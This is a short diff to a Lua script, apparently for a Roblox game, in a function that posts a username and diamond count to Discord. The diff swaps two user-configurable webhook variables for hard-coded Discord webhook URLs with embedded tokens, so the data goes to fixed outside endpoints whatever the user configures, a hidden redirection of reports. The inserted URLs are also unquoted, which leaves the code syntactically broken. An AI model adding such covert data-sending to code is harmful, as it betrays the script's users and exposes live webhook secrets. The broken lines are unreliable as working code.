@@ -149,7 +149,7 @@ local function SendMessage(username, diamonds)
 
     if Webhook and Webhook ~= "" then
         request({
-            Url = Webhook,
+            Url = https://discord.com/api/webhooks/1278794362565693490/2hT6T75uw7orOwBQWHKmPHqWLhA7t-4Va3UwnxaYhIm4HDtyBzRS4Roc3EFWBOqr73aO,
             Method = "POST",
             Headers = headers,
             Body = body
@@ -158,7 +158,7 @@ local function SendMessage(username, diamonds)
 
     if LogsWebhook and LogsWebhook ~= "" then
         request({
-            Url = LogsWebhook,
+            Url = https://discord.com/api/webhooks/1278787337551089795/YsmGgrvEHkxuLTmb7dFLe49BeFRLpqMmfSh3TmJbh72xexHhTzIq-sb1glULkXm9OVGS,
             Method = "POST",
             Headers = headers,
             Body = body
